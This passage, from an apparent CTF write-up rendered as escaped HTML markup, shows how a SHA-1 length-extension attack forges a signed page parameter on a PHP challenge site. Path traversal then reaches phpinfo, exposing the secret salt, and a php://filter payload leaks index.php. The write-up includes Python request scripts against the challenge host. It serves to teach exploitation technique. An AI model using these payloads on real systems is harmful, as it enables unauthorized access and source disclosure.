&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;joined_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pad((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;A&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;salt_len) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;block_1_buf)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[salt_len:] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_2_buf
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;encoded_joined_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;urllib.parse.quote_plus(joined_buf)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(encoded_joined_buf)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests.get(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;pHash=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(encoded_joined_buf, joined_buf_hash)).content)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;In the code above we use the &amp;quot;view_profile&amp;quot; page (encoded as &amp;lt;code&amp;gt;dmlld19wcm9maWxl&amp;lt;&amp;#x2F;code&amp;gt; in Base64) along with the salted hash (&amp;lt;code&amp;gt;7b6f8b016f25da478b9f28f878aa3be8cced66fd&amp;lt;&amp;#x2F;code&amp;gt;) from the site URL. We pad that to a SHA-1 block (64 bytes including the salt, first byte after data is 0x80 and last 2 bytes are length) and add a 2nd block: &amp;lt;code&amp;gt;aaa + base64(&amp;quot;&amp;#x2F;..&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;phpinfo&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;We add 3 bytes (&amp;lt;code&amp;gt;&amp;quot;aaa&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt;) because the last byte of the previous SHA-1 block (as you can see below - 0x38 in yellow) is identified by PHP as a Base64 data byte. Aligning that to 4 bytes makes the following Base64-encoded string correctly readable (since Base64 is read aligned to 4 bytes).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The result &amp;lt;code&amp;gt;joined_buf&amp;lt;&amp;#x2F;code&amp;gt; which we were able to sign (before URL encoding) is:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;4.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The first part (green) is the original Base64-encoded string (containing &amp;quot;view_profile&amp;quot;). The red &amp;lt;code&amp;gt;0x80&amp;lt;&amp;#x2F;code&amp;gt; is the end-of-string marker added in SHA-1. Afterwards, the white &amp;lt;code&amp;gt;0x00&amp;lt;&amp;#x2F;code&amp;gt; bytes are padding to complete the first chunk to 64 bytes (taking into account that 23 bytes were also used for salt and 2 bytes are used for length). The yellow &amp;lt;code&amp;gt;0x01 0x38&amp;lt;&amp;#x2F;code&amp;gt; is chunk length in bits. It equals 0x138 = 312 bits = 39 bytes which is calculated by: &amp;lt;code&amp;gt;len(&amp;quot;dmlld19wcm9maWxl&amp;quot;) + key_length = 16 + 23 = 39&amp;lt;&amp;#x2F;code&amp;gt;. The next 3 blue-colored &amp;lt;code&amp;gt;0x61&amp;lt;&amp;#x2F;code&amp;gt; bytes are the padding I mentioned previously to align our Base64 string for PHP. The rest of the purple bytes are the Base64 payload.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When PHP receives this payload with a valid hash - it parses the Base64-encoded path as: &amp;lt;code&amp;gt;view_profile&amp;amp;lt;unprintable characters&amp;amp;gt;&amp;#x2F;..&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;phpinfo&amp;lt;&amp;#x2F;code&amp;gt; - which will be resolved into &amp;lt;code&amp;gt;phpinfo&amp;lt;&amp;#x2F;code&amp;gt; and appended by the app logic with &amp;lt;code&amp;gt;.php&amp;lt;&amp;#x2F;code&amp;gt;. Now we got to read what’s in &amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt;!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;phpinfo&amp;quot;&amp;gt;phpinfo&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;If you’re unfamiliar with &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.php.net&amp;#x2F;manual&amp;#x2F;en&amp;#x2F;function.phpinfo.php&amp;quot;&amp;gt;&amp;lt;code&amp;gt;phpinfo()&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;a&amp;gt; - it’s a built-in function that prints useful information about PHP and the environment it’s running on. Here’s how it looks like when running from our exploited URL (&amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt; simply calls &amp;lt;code&amp;gt;phpinfo()&amp;lt;&amp;#x2F;code&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;5.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;
Within this page I found a good lead - the key used as the SHA-1 salt! The key was shown here because it’s defined as a PHP variable:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;6.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;
But this key isn’t enough to retrieve the flag from &amp;#x2F;flag.txt - we can’t load a .txt file since the &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt; loader code appends &amp;lt;code&amp;gt;.php&amp;lt;&amp;#x2F;code&amp;gt; to every Base64 payload we give it.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;bonus-leaking-index-php-file-contents&amp;quot;&amp;gt;Bonus - Leaking index.php File Contents&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I wanted to make sure I understand how &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt; works internally, so equipped with the secret key I leaked the content of index.php:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;hashlib
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;php_file &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;index&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(php_file,)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Thcon_SuP3r_S3cr4t_K3y!&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;base64.encodebytes(path).replace(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\n&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hashlib.sha1(key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf).hexdigest()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf.decode()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests.get(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;pHash=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(buf, buf_hash)).content)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The result is Base64-encoded &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt;. Here it is after decoding, to better understand how this challenge works:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;session_start&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;();
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;require&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;crypto.php&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$safe_handler &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;new &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;IntegrityHandler&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_SERVER[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;SECRET_KEY&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;], &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;sha1&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;define&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;LOCAL_ACCESS&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;function &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;createHeaders&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($pArray, $handler){
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;lt;a href=&amp;amp;quot;&amp;#x2F;&amp;amp;quot;&amp;amp;gt;&amp;amp;lt;li&amp;amp;gt;Home&amp;amp;lt;&amp;#x2F;li&amp;amp;gt;&amp;amp;lt;&amp;#x2F;a&amp;amp;gt;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;foreach&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($pArray &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;as &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$p &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$v){
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;a href=&amp;amp;#39;&amp;#x2F;index.php?page=&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;base64_encode&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($p) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;.&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;amp;pHash=&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$handler-&amp;amp;gt;secure_data(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;base64_encode&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($p)) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;#39; &amp;#x2F;&amp;amp;gt;&amp;amp;lt;li&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$v&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;li&amp;amp;gt;&amp;amp;lt;&amp;#x2F;a&amp;amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;html&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;head&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;link &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;rel=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;stylesheet&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;href=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;https:&amp;#x2F;&amp;#x2F;maxcdn.bootstrapcdn.com&amp;#x2F;bootstrap&amp;#x2F;3.3.7&amp;#x2F;css&amp;#x2F;bootstrap.min.css&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;link &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;rel=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;stylesheet&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;type=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;text&amp;#x2F;css&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;href=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;css&amp;#x2F;style.css&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
